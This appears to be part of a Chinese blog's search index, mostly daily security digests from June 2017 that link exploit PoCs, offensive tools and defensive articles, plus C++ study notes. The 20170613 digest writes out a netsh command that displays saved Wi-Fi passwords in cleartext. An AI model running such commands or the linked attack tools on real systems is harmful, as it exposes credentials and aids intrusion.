Writeuphttps://kitctf.de/writeups/googlectf/x-sanitizer Eternalchampion SMB 漏洞（MS17-010）的多个 PoChttps://github.com/worawit/MS17-010 一个包含二进制逆向和利用的docker容器https://github.com/superkojiman/pwnbox 跨站的艺术-XSS入门与介绍http://www.fooying.com/the-art-of-xss-1-introduction/ awvspy python模块https://github.com/wcc526/awvspy1awvs 扫描器的接口，直接就可以用python调用接口去进行扫描了，就像python的nmap模块直接调用nmap一个原理。]]></content>
      <categories>
        <category>每日安全动态</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PyCharm: The project at … uses a non-standard layout and cannot be attached to this project]]></title>
    <url>%2F2017%2F06%2F19%2FPyCharm-The-project-at-%E2%80%A6-uses-a-non-standard-layout-and-cannot-be-attached-to-this-project%2F</url>
    <content type="text"><![CDATA[问题PyCharm: The project at … uses a non-standard layout and cannot be attached to问题的解决： referer: https://stackoverflow.com/questions/43792869/pycharm-the-project-at-uses-a-non-standard-layout-and-cannot-be-attached-to/43879392#43879392 1题外话：程序员还是要用古狗啊]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170619安全动态]]></title>
    <url>%2F2017%2F06%2F19%2F20170619%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 看我如何在赛门铁克邮件安全网关上实现弱口令到RCE漏洞执行http://www.freebuf.com/articles/network/137341.html 1又是弱口令惹的祸，在渗透测试过程中很多情况都是弱口令导致的，自己在github上开了个项目，也是搜集的常见字典，自己如果遇到像是这种好的密码，就不断的push上去，感觉比在本地维护应该会好些，然后呢，将伟大的自动爆破平台列入开发计划，包括web自动识别爆破，常见端口服务的自动识别和对应爆破。。 PHP 模块 rootkit 后门开发与防御https://blog.paradoxis.nl/your-interpreter-isnt-safe-anymore-the-php-module-rootkit-c7ca6a1a9af5 利用 Qualified 团队开发的在线代码运行引擎的漏洞，结合 SSRF，攻击 AWS metadata servicehttps://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/ 微软官方的blog，分析了 Shadow Brokers 的 ETERNALROMANCE 和 ETERNALBLUE 两个 SMB Exploit 所用的技术，并且介绍了 Windows 10 是如何利用 Device Guard 和 kCFG 来防御的https://blogs.technet.microsoft.com/mmpc/2017/06/16/analysis-of-the-shadow-brokers-release-and-mitigation-with-windows-10-virtualization-based-security/?platform=hootsuite 远程遥控 IPTables 进行端口复用https://threathunter.org/topic/594545184ea5b2f5516e2033 ManageEngine 代码执行漏洞https://blogs.securiteam.com/index.php/archives/3228 CVE-2017-9233漏洞解析https://libexpat.github.io/doc/cve-2017-9233/ CTF比赛中SQL注入的一些经验总结http://www.freebuf.com/articles/web/137094.html 2017年最佳iPhone渗透APP及工具http://www.freebuf.com/sectool/137504.html [漏洞分析]Samba远程代码执行漏洞(CVE-2017-7494)分析https://xianzhi.aliyun.com/forum/read/1728.html CVE-2017-8464 LNK 远程代码执行漏洞http://b404.xyz/2017/06/17/use-windows-link-file-to-attack 1影响面还是很广的(gif动态已经最小了，有时候还是加载不出来:( Metasploithttp://b404.xyz/2017/06/17/MetasploitMSFconsole Commandshttps://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/ 1作者整理了一些metasploit工具的使用方法和技巧，我近期也准备研究一下metasploit，主要是代码方面的，分析一下msf的框架 【YISRC】技术分享——HTTPS通信知多少？https://mp.weixin.qq.com/s?__biz=MzIyNjQzMjcyNw==&amp;mid=2247484634&amp;idx=1&amp;sn=919d8e864b989ac0d6ac94b005df6598&amp;chksm=e871c762df064e74a9b24c9f59f870434a716487460567eda837a5609459298e7a5c7aec205e&amp;scene=0&amp;key=51ed750aa8560dbf71b3ea5dda9a9cf3046a8fb8aef9dad3170e4188e41460eb01c905c3d89f28828d9bfd9b5a062b6c898566d959dd030dd08a7e15e10809b8f18659b78a33bfd886a79b330fd7af1a&amp;ascene=0&amp;uin=NzQxNDQ1&amp;devicetype=iMac+MacBookPro11%2C3+OSX+OSX+10.12.5+build(16F73)&amp;version=12020810&amp;nettype=WIFI&amp;fontScale=100&amp;pass_ticket=Y2%2F4SmK1w2g0n8a3eP2Q80FuyDZWLKoetwZOfnE98VE%3D 浅谈Windows 10中藏着的那个Linuxhttp://www.freebuf.com/column/137639.html 教你如何让SSH使用一次性密码登陆http://www.freebuf.com/articles/system/137580.html]]></content>
      <categories>
        <category>每日安全动态</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[20170616安全动态]]></title>
    <url>%2F2017%2F06%2F16%2F20170616%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 逆向入门：方法和工具https://0x00sec.org/t/re-guide-for-beginners-methodology-and-tools/2242 RED_HAWK - 基于PHP编写的集信息收集、SQL漏洞扫描与爬虫于一体的渗透测试工具https://github.com/Tuhinshubhra/RED_HAWK malwaresearch - 在线搜索并自动下载恶意软件样本的命令行工具https://github.com/MalwareReverseBrasil/malwaresearch OWASP 整理的移动安全研究过程中常用的一些工具https://github.com/OWASP/owasp-mstg/blob/master/Document/0x08-Testing-Tools.md getsploit - 在线搜索并自动下载漏洞利用的命令行工具https://github.com/vulnersCom/getsploit 浏览器地址栏之困，来自玄武实验室研究员 xisigr 在中国网络安全大会（NSC2017）的演讲https://github.com/xisigr/paper/blob/master/NSC2017%E7%AC%AC%E4%BA%94%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E4%BC%9A/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E4%B9%8B%E5%9B%B0.pdf Phoenix Talon” in Linux Kernel —潜伏长达11年之久的内核漏洞，来自 启明星辰 ADLabhttp://mp.weixin.qq.com/s/6NGH-Dk2n_BkdlJ2jSMWJQ 在线ssh加密检测工具https://sshcheck.com/ 扫描域权限和特权帐户https://adsecurity.org/?p=3658 云基础架构之固件安全合规https://hardenedlinux.github.io/system-security/2017/06/15/firmware_compliance.html?from=timeline]]></content>
      <categories>
        <category>每日安全动态</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[20170615安全动态]]></title>
    <url>%2F2017%2F06%2F15%2F20170615%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 Spring知识点总结https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&amp;mid=2652843354&amp;idx=1&amp;sn=fc34d08480f5aa9a681da17cf79341ea&amp;chksm=bd5951978a2ed881d18d39d648637f218d6c21b31876f1eb03938ac3a36ed0c9ee1dd68fb40e&amp;mpshare=1&amp;scene=23&amp;srcid=0614irDQetOrHlw71WQMMh6n#rd Nmap 7.50新增了855个指纹，新增了14个NSE脚本,建议下载并进行更新https://nmap.org/changelog.html 某P2P系统对象自动绑定漏洞可任意充值https://threathunter.org/topic/593ff6bc9c58e020408a79d4 http://agrrrdog.blogspot.ru/2017/03/autobinding-vulns-and-spring-mvc.html 1竟然还有这种操作,其中第二个是外文的链接，解释的比较清晰，且Github上面有源码可供测试使用 被忽视的攻击面：Python package 钓鱼http://paper.seebug.org/326/?from=timeline&amp;isappinstalled=0 ELK+Filebeat+Kafka+ZooKeeper 构建海量日志分析平台http://9a81eb20.wiz03.com/share/s/2qwuIw2wLkNy2pMKJm3YhVsX3DjIK21Z6k5s2db9Is3010OP?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io 企业安全建设之路：端口扫描（下）http://www.freebuf.com/articles/system/137016.html http://www.kitploit.com/2017/06/hashcat-v360-worlds-fastest-and-most.htmlhttp://www.kitploit.com/2017/06/hashcat-v360-worlds-fastest-and-most.html Hashcat v3.6.0 世界上最快的密码破解工具？http://www.kitploit.com/2017/06/hashcat-v360-worlds-fastest-and-most.html UNIX security auditing tool: lunarhttps://n0where.net/unix-security-auditing-tool-lunar/ 有研究者公开了一个前两周的 Linux Sudo get_process_ttyname()(CVE-2017-1000367) 漏洞的 Exploithttp://seclists.org/oss-sec/2017/q2/470 蝴蝶效应与程序错误 - 一个渣洞的利用之旅（CVE-2016-9651），介绍了 Gong Guang 如何利用 V8 对象私有属性的逻辑漏洞(利用对象赋值)-&gt;越界读(unescape)-&gt;越界写(堆风水)-&gt;任意地址读写(改写 JITted Code Buffer)-&gt;任意代码执行的过程，整个过程非常巧妙https://github.com/secmob/pwnfest2016 IE Localhost 沙箱逃逸的漏洞(CVE-2017-0226)，从 PM 到穿透 EPMhttp://thomas-vanhoutte.blogspot.be/2017/06/making-zdi-localhost-escape-work-from.html php里面的随机数http://5alt.me/2017/06/php%E9%87%8C%E7%9A%84%E9%9A%8F%E6%9C%BA%E6%95%B0/ HP 打印机从只有一个 CVE-2017-2741 编号的漏洞公告到发现漏洞并实现远程代码执行 https://www.tenable.com/blog/rooting-a-printer-from-security-bulletin-to-remote-code-execution IDA Pro debug server RCE 漏洞的 Metasploit 利用模块，影响 Linux &amp; Windows 平台的 IDA 6.6/6.8/6.9https://github.com/rapid7/metasploit-framework/pull/8474 Armory Sandbox - 基于 USB armory 打造一个用于分析 USB 设备是否内嵌恶意软件的 USB analyzerhttps://sentinelone.com/blogs/armory-sandbox-building-usb-analyzer-usb-armory/ 绕过多种保护机制编译的Web服务器http://arielkoren.com/blog/2017/06/14/fusion-level05-solution/ 服务器端请求伪造（SSRF）环境的搭建和利用https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF Mdaemon NSA方程式Easybee攻击程序漏洞复现与分析http://blog.jowto.com/?p=264 1国内用这种邮件服务器的好像不多 HackSysExtreme 驱动任意地址写漏洞的利用https://osandamalith.com/2017/06/14/windows-kernel-exploitation-arbitrary-overwrite/ 一堆浏览器的漏洞 Edge 浏览器 SparseArraySegment 内存破坏漏洞（CVE-2017-0138）的细节与 PoC： http://www.security-assessment.com/files/documents/advisory/sparsearraysegment.pdf IE 浏览器 “TryGetProperty” 内存破坏漏洞（CVE-2017-0049）的细节与 PoC：http://www.security-assessment.com/files/documents/advisory/trygetproperty.pdf IE 浏览器 “ToPrimitive” 内存破坏漏洞（CVE-2017-0130）的细节与 PoC： http://www.security-assessment.com/files/documents/advisory/toprimitive.pdf IE 浏览器 “ReverseSegment” 内存破坏漏洞（CVE-2017-0040）的细节与 PoC： http://www.security-assessment.com/files/documents/advisory/reversesegment.pdf Edge 浏览器 comparestring 信息泄露漏洞的细节与 PoC(CVE-2017-0009)： http://www.security-assessment.com/files/documents/advisory/comparestring_infoleak.pdf]]></content>
      <categories>
        <category>每日安全动态</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[20170614安全动态]]></title>
    <url>%2F2017%2F06%2F14%2F20170614%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 【重大漏洞预警】Windows两个关键远程代码执行漏洞http://bobao.360.cn/learning/detail/3977.html DNS隧道技术解析https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247484066&amp;idx=1&amp;sn=aff9df0cde254e9900da4d4264886480&amp;chksm=ec1e328adb69bb9ce1e95ea0abc19e046f29375e3d25e45a4236b806a2177f6e28d661c52e6e&amp;mpshare=1&amp;scene=23&amp;srcid=061454Cz67xcFN1T3GhNifnj#rd 微软出了两个高危漏洞Windows Search Remote Code Execution Vulnerability (CVE-2017-8543) and a LNK Remote Code Execution Vulnerability (CVE-2017-8464)https://threatpost.com/microsoft-patches-two-critical-vulnerabilities-under-attack/126239/ 堡垒机工作机制https://mp.weixin.qq.com/s?__biz=MzI3NzMzNzE5Ng==&amp;mid=2247484486&amp;idx=2&amp;sn=7f641c4180219b2a75bf714a29ef0dc2&amp;chksm=eb668145dc110853748c37920f11e42ded46d055627784341ae9c62d5b860a295b1c7ead6995&amp;mpshare=1&amp;scene=23&amp;srcid=06144aGVVOd6GTIn2s2F5glR#rd Metasploit实验：制作免杀payload+对任意“外网”主机的远控http://www.freebuf.com/sectool/136736.html Github泄露监测工具https://github.com/0xbug/Hawkeye 1这人的github上面都是甲方相关的一些项目，甲方的小伙伴可以关注一下 内存中检测恶意软件https://www.endgame.com/blog/technical-blog/hunting-memory 使用 Sysmon 与 Splunk 进行高级事件检测与威胁捕获http://security-research.dyndns.org/pub/slides/FIRST2017/FIRST-2017_Tom-Ueltschi_Sysmon_FINAL.pdf 微软将在今年秋季的 Windows 10 RS3 中开始禁用 SMBv1 文件共享协议https://www.bleepingcomputer.com/news/microsoft/microsoft-to-disable-smbv1-in-windows-starting-this-fall/ WordSteal - 用于构造窃取远程机器 NetNTLM Hash 的 Word 文件的脚本 https://github.com/0x09AL/WordSteal HTTrack是一个网站镜像工具，本来是用来抓取网站做离线浏览用的。但是我发现它的爬虫特性和搜索引擎爬虫非常的像，逐渐应用到了自己的SEO工作中。其实这两种看似不同的爬虫做的都是同样的工作，就是复制网站并存储下来http://www.httrack.com/ 劫持一个国家的顶级域名之旅-域名后缀的隐藏威胁（中）http://bobao.360.cn/learning/detail/3975.html 透过F5获取服务器真实内网IPhttp://www.lewisec.com/2017/06/13/Get_the_real_IP_through_F5/ 使用MSRC API和get-msrcvulnerabilityreport API来生成CVEs月报。https://github.com/JohnLaTwC/MSRC/blob/master/Reports/MSRC_CVEs2017-Jun.html SMB协议研究https://www.wikiwand.com/en/Server_Message_Block kali linux dockerhttps://www.kali.org/news/official-kali-linux-docker-images/1注意文章中]]></content>
      <categories>
        <category>每日安全动态</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[20170613安全动态]]></title>
    <url>%2F2017%2F06%2F13%2F20170613%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 执行下面的命令可在windows 10、8.1以及7上获取保存的 #Wi-Fi# 明文密码： netsh wlan show profilesnetsh wlan show profile name= key=clearhttp://blog.digital-forensics.it/2015/01/happy-dpapi.html?m=1 一键自动化域渗透工具（含演示视频）http://www.freebuf.com/sectool/136224.html mazda_getInfo - 攻击马自达汽车娱乐信息系统 USB 端口的 PoChttps://github.com/shipcod3/mazda_getInfo MacSpy: OS X RAT as a Service，MacSpy 被认为是 macOS 系统中目前最为复杂的间谍软件https://www.alienvault.com/blogs/labs-research/macspy-os-x-rat-as-a-service ShutIt - 一款终端环境的 Shell 自动化框架，基于 expect 库，可以同时管理多个服务器 shell 会话https://learnxinyminutes.com/docs/shutit/ PowerLessShell - 在不调用 PowerShell.exe 的情况下执行 PowerShell 脚本 https://github.com/Mr-Un1k0d3r/PowerLessShell 利用 Waitfor.exe 实现后门机制https://3gstudent.github.io/3gstudent.github.io/Use-Waitfor.exe-to-maintain-persistence/ 初识 Fuzzing 工具 WinAFLhttp://paper.seebug.org/323/ 【经典好文】- 攻击JavaWeb应用 [1]https://threathunter.org/topic/593ea6b1a5edfd44628f5b34 Windows 日志攻防之攻击篇https://threathunter.org/topic/593eb1bbb33ad233198afcfa shell在手分析服务器日志不愁https://segmentfault.com/a/1190000009745139 SSRF/XXE/XSS 扫描工具https://github.com/jobertabma/ground-control MAC 下wifi密码破解工具http://www.freebuf.com/sectool/136664.html 手工搭建伪基站监控系统http://www.freebuf.com/sectool/136738.html FlaskJinja2 开发中遇到的的服务端注入问题研究 IIhttp://www.freebuf.com/articles/web/136180.html 利用powershell进行端口扫描http://bobao.360.cn/learning/detail/3961.html Belati is tool for Collecting Public Data &amp; Public Document from Website and other service for OSINT purposehttps://github.com/aancw/Belati]]></content>
      <categories>
        <category>每日安全动态</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[20170612安全动态]]></title>
    <url>%2F2017%2F06%2F12%2F20170612%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 Apple FSEvents（文件系统事件）相关的取证问题总结 &lt; http://nicoleibrahim.com/apple-fsevents-forensics/&gt; macOS Disk Arbitration Daemon 条件竞争提权漏洞利用脚本（CVE-2017-2533） https://www.exploit-db.com/exploits/42146/ kwetza - 向 Android 应用中注入 Meterpreter payload 的 Python 脚本 https://github.com/sensepost/kwetza 如何通过WiFi热点实施网络钓鱼http://xeushack.com/phishing-with-a-rogue-wifi-access-point 渗透测试实验环境搭建：通过Proxmox VE构建域环境 psad - Intrusion Detection with iptables Logshttps://github.com/mrash/psad/blob/master/README.md Linux之DNS服务器搭建及常见DNS攻击和防御https://mp.weixin.qq.com/s?__biz=MzI3NzMzNzE5Ng==&amp;mid=2247484468&amp;idx=1&amp;sn=1c30bd929c57b438a8a75003d2f0fd94&amp;chksm=eb668137dc1108217a1c8594b5d1ebf0f3a6c5c9f048ddbe0a9d01cd0d73e098720bbe0387c2&amp;mpshare=1&amp;scene=23&amp;srcid=0611T0yATydptfUoJpaq3G2i#rd 一个sizeof引发的血案https://zhuanlan.zhihu.com/p/26815897 前端跨域请求原理及实践https://mp.weixin.qq.com/s?__biz=MzAxODE2MjM1MA==&amp;mid=2651552250&amp;idx=1&amp;sn=f168cb8272e61ccd30b216db73bb6ae3&amp;chksm=8025ae3bb752272dd59c47d89faaada6e82c20c2e84c188a2bd5c1efd566d23dcda32cd37019&amp;mpshare=1&amp;scene=23&amp;srcid=0611bAo4MuFZR3LhkUxTYOy7#rd 如何通过公开的漏洞披露信息，完成开源程序漏洞的环境构建与验证http://bobao.360.cn/learning/detail/3966.html 蓝牙App漏洞系列分析之二CVE-2017-0639https://xianzhi.aliyun.com/forum/read/1713.html Windows 10下MS16-098 RGNOBJ整数溢出漏洞分析及利用https://security.tencent.com/index.php/blog/msg/117 “同形异义字”钓鱼攻击，钉钉中招http://www.freebuf.com/articles/web/136729.html 逢敌必亮剑——如何有效地开展应急响应工作http://blog.nsfocus.net/effectively-carry-emergency-response-work/]]></content>
      <categories>
        <category>每日安全动态</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[c++易混淆点笔记]]></title>
    <url>%2F2017%2F06%2F12%2Fc-%E6%98%93%E6%B7%B7%E6%B7%86%E7%82%B9%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[简介 主要记录一些容易忽略和忘记的知识点，原因是有些知识点刚看过之后觉的懂了，但是过段时间可能又忘记了的情况。记录 基本数据类型Fundamental typesWindows Data Types.aspx) 指针类型和引用类型 构造函数初始化数据成员的方式，除了在函数体中使用复制和赋值等方法外，还可以使用初始化表，初始化表位于参数表和函数体之间，以：开头，由一个或多个初始化项构成，多个初始化项以逗号相分隔，一般的形式为：:数据成员1（表达式1），。。。，数据成员n（表达式n）常值数据成员、对象成员和从基类继承来的数据成员等特殊成员的初始化，必须采用初始化表(不得不说语法真是复杂，还是必须。。) 函数指针和回调函数参考刚开始还不好理解，其实还挺有意思的，就是你可以函数指针变量可以作为某个函数的参数来使用，那么这个函数 内联函数可以这么理解，调用函数的时候，系统需要做一系列的辅助工作(例如保护现场，为函数所用变量分配内存，实参赋值给形参等)，然后转去执行被调用函数的函数体，当执行完成后，还要做一系列的辅助工作，再接着执行函数调用之后的语句。这个过程时候时间开销的，为了节省时间，c++允许定义内联函数，就是函数在编译的时候会把你的调用处的函数替换成函数体。虽然代码存储空间可能变大了，但是整个程序的执行时间变小了。此外，在类体内定义的成员函数默认为内联的，而要在类体外定义内联的成员函数，则需要用关键字inline进行声明。 函数重载函数重载是指多个函数使用相同的函数名。函数重载是多态性的体现，即用同一个函数名实现多种函数调用。函数重载一般是函数的参数个数或者参数类型不同，这个时候，编译器会根据这个差别来进行差别性编译。 虚函数和纯虚函数虚函数其实就是虚拟函数的意思，virtual function，感觉翻译成虚拟函数就挺好的，不知道为啥翻译到国内就是叫虚函数，感觉怪怪的。这个虚拟函数和函数重载的概念有点儿相似，在派生类中可以通过重写虚拟函数来实现对基类虚拟函数的覆盖。（感觉像是java里面的接口），这也是多态性的体现（注意这里是运行时的多态性，不同于函数重载编译时的多态性）。c++接口(抽象类) std standard的缩写，我们在使用c++的标准库的标识符的时候需要使用using namespace std；使用了命名空间std的有 cstdio cmath csring string等。 今天学习STL,才真正意识到什么是容器。也觉得以前都没有怎么去理解容器，每一种语言都有自己的容器，像python中有list、dict、tuple等容器，java中有arraylist、hashset、hashmap等容器，可以说容器是复杂的数据结构(相对于简单的数据结构int，float这种)。c++ 中标准STL序列容器：vector、string、deque和list。标准STL关联容器：set、multiset、map和multimap。每种容器类型都定义了自己的迭代器类型，如vectorvector::iterator iter;这条语句定义了一个名为iter的变量，它的数据类型是由vector定义的iterator类型。list::iterator iter1;这条语句定义了一个名为iter1的变量，它的数据类型是由list定义的iterator类型。wiki对容器的介绍) C++ 的可移植性和跨平台开发https://msdn.microsoft.com/zh-cn/library/dn707591.aspxhttps://program-think.blogspot.com/2009/01/cxx-cross-platform-develop-0-overview.html google c++ 编程规范http://google.github.io/styleguide/cppguide.html 预编译 1234预编译又称为预处理，是做些代码文本的替换工作。处理#开头的指令，比如拷贝#include包含的文件代码，#define宏定义的替换,条件编译等就是为编译做的预备工作的阶段主要处理#开始的预编译指令 不同的编译器以及不同的语言标准gcc wikignu c compiler，因为它原本只能处理C语言。GCC很快地扩展，变得可处理C++。之后也变得可处理Fortran、Pascal、Objective-C、Java、Ada，以及Go与其他语言。关于gcc和g++ 的区别的问题，下面一张图应该可以明白没错，他们指向的是同一个可执行文件，但是还是有区别的，就是使用g++ 编译的时候，可以使用c++的标准库，使用gcc命令编译的时候，可以使用c的标准库。stackoverflow link 还有一个编译器不得不说，那就是clang，他一个C、C++、Objective-C和Objective-C++编程语言的编译器前端。他的出现目的是替代GCC，是在苹果公司的赞助支持下开发的。测试证明Clang编译Objective-C代码时速度为GCC的3倍[4]，还能针对用户发生的编译错误准确地给出建议. 类类型与结构体类型相似，结构体类型也可以有函数成员，主要区别在于，类类型的默认访问权限是private，结构体类型的缺省访问权限是public。类的数据成员和函数成员分别描述该类实体的属性和行为。即这个实体有什么属性，它有什么样的行为。对象也是一种变量，是一种类类型的变量。对于已声明的类，可以使用它来定义变量。在建立对象时，只为对象分配用于保存数据成员的内存空间，而类中定义的成员函数的代码被放在计算机内存的一个公共区中，并供该类的所有对象共享，这是c++实现对象的一种方法。逻辑上，仍将每一个对象理解为由独立的数据成员和各自的成员函数组成。 结构体指针 struct stu *pstu = &stu1; ：：在c++中是作用域符号。 c和c++ 不同的标准可见，c++的标准有c++98，c++11,c++14,c++17,c++后面对应的数字是年份的意思c语言的标准有c90，c99，以及c11，可见最新的c标准是c11.关于他们之前的差异。关于c11和c99的区别)关于c++各个版本之前的区别高速上手 C++ 11/14vc6.0与标准C++ISO cpp c++ 第三方库c++准标准库boostgoogle 的c++基础库 abseil 多线程c程序https://msdn.microsoft.com/zh-cn/library/esszf9hw.aspxhttp://zh.highscore.de/cpp/boost/multithreading.html c语言的json操作库https://github.com/akheron/jansson使用boost操作json c/c++ 内存泄露及检测http://www.cnblogs.com/skynet/archive/2011/02/20/1959162.html const关键字的使用方法http://www.cnblogs.com/jiabei521/p/3335676.html 关于msvc的介绍https://www.wikiwand.com/zh-hans/Microsoft_Visual_C%2B%2B 123456789101112131415161718MSVC++ 14.1 _MSC_VER == 1911 (Visual Studio 2017)MSVC++ 14.1 _MSC_VER == 1910 (Visual Studio 2017)MSVC++ 14.0 _MSC_VER == 1900 (Visual Studio 2015)MSVC++ 12.0 _MSC_VER == 1800 (Visual Studio 2013)MSVC++ 11.0 _MSC_VER == 1700 (Visual Studio 2012)MSVC++ 10.0 _MSC_VER == 1600 (Visual Studio 2010)MSVC++ 9.0 _MSC_FULL_VER == 150030729 (Visual Studio 2008, SP1)MSVC++ 9.0 _MSC_VER == 1500 (Visual Studio 2008)MSVC++ 8.0 _MSC_VER == 1400 (Visual Studio 2005)MSVC++ 7.1 _MSC_VER == 1310 (Visual Studio 2003)MSVC++ 7.0 _MSC_VER == 1300MSVC++ 6.0 _MSC_VER == 1200MSVC++ 5.0 _MSC_VER == 1100打印版本 msvc#ifdef _MSC_VER cout &lt;&lt; _MSC_VER &lt;&lt; endl;#endif VS的调试技巧https://blogs.msdn.microsoft.com/c/2016/09/19/visual-studio-c%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7%E5%92%8C%E7%AA%8D%E9%97%A8/ 检测变量类型的方法 typeinfo 头http://www.cplusplus.com/forum/general/21246/小结 相对于其它脚本语言python、php啥的，c++的语法稍有些复杂，尤其是在windows下进行c++开发的时候，一开始一大堆的宏定义就小白们搞懵了。如果要写c++入门建议还是学linux下的c++，等学差不多了，再切换windows相对来说就容易一些了。 c++较写脚本语言开发感觉还是会慢一点，脚本语言不用编译，c++每次修改一点儿，都要重新编译和链接，而且工程越大，时间就越长。]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170611安全动态]]></title>
    <url>%2F2017%2F06%2F11%2F20170611%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 国外黑阔的渗透实战经验的一些有趣的经历 不同寻常的journey https://pentest.blog/article-series/ Dump the hashes off a Windows Server 2008 x64 box via Metasploit https://asciinema.org/a/124270 1发现用asciinema这个网站录‘视频‘的还挺多 waf的绕过技巧 http://www.freebuf.com/articles/web/136723.html 编译和链接 http://b404.xyz/2017/06/10/compile-and-link python上面的多线程tor代理 http://www.kitploit.com/2017/06/pymultitor-python-multi-threaded-tor.html DNS rebinding http://www.bendawang.site/article/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93 nodejs学习记录(更新了一下) http://www.cnblogs.com/mrchang/p/6377725.html]]></content>
      <categories>
        <category>每日安全动态</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[20170610安全动态]]></title>
    <url>%2F2017%2F06%2F10%2F20170610%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 一个windows本地信息搜集的ps脚本 https://www.blackhillsinfosec.com/?p=58241测试了一下效果不错，里面有一个DNS cache对于信息搜集来说挺好 内网中的针对RDP的中间人攻击 https://github.com/SySS-Research/Seth/blob/master/doc/paper/Attacking_RDP-Paper.pdf Heimdall 集中管理*nix机器漏洞的web工具http://www.kitploit.com/2017/06/heimdall-manage-vulnerables-packages-in.html 1看过了介绍视频还可以，运维的童鞋可以看看 facebook的一个任意邮箱地址获取的漏洞 https://www.youtube.com/watch?v=RkRKTH7fXqQ 1获取任意用户的邮箱，facebook给的bounty还挺高的]]></content>
      <categories>
        <category>每日安全动态</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[20170609安全动态]]></title>
    <url>%2F2017%2F06%2F09%2F20170609%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 Domain Hunter - 域名信誉对于攻击者从事钓鱼和 C&amp;C 很重要，所以攻击者开始尝试注册一些过期的历史信誉良好的域名，用于躲避检测。Domain Hunter 这个工具用于识别这类域名 https://github.com/minisllc/domainhunter 穿越边界的姿势 https://mp.weixin.qq.com/s/l-0sWU4ijMOQWqRgsWcNFA 破解了十款路由器之后，我们有话要说 https://zhuanlan.zhihu.com/p/27312102 docker搭建私有仓库 http://kekefund.com/2017/06/07/doker-registry/ 简单的机器学习 http://kekefund.com/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/ win10 winserver2012 2016 的一个提权 CVE-2017-0213 http://www.hackingarticles.in/bypass-admin-access-guest-account-windows-10/ https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213 0day RCE Exploit for Google Chrome 59.0.3071.86https://www.youtube.com/watch?v=DUHMhObmWdU 1真的是0day啊，老外真牛逼 深入理解java反序列化漏洞 http://paper.seebug.org/312/?from=timeline&amp;isappinstalled=0 sitemap 扫描工具 也就是网站目录以及文件扫描工具 https://github.com/JusticeRage/freedomfighting#listurlpy]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170608]]></title>
    <url>%2F2017%2F06%2F08%2F20170608%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 WannaLocker - 针对国内 Android 用户的 WannaCry 勒索软件仿制版本出现了，当然只是勒索界面比较像 https://blog.avast.com/wannacry-wannabe-targeting-android-smartphones Cisco AnyConnect（Windows 版本）存在一个 DLL 加载本地 SYSTEM 提权漏洞（CVE-2017-6638） https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170607-anyconnect CI框架下column注入 http://www.wupco.cn/?p=3646 利用应用程序验证器进行hook函数和持久化 http://blacksunhackers.club/2017/06/leveraging-application-verifier-for-function-hooking-and-persistence/ 关于现代无线鼠标和键盘的安全性报告 https://www.exploit-db.com/docs/42109.pdf 蜜罐技术 https://ipot.sec-wiki.com/ 1自己对蜜罐技术比较感兴趣，有想法的小伙伴我们交流一下 windows 和linux 提权的一些exp https://github.com/SecWiki/windows-kernel-exploits https://github.com/SecWiki/linux-kernel-exploits]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170607安全动态]]></title>
    <url>%2F2017%2F06%2F07%2F20170607%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
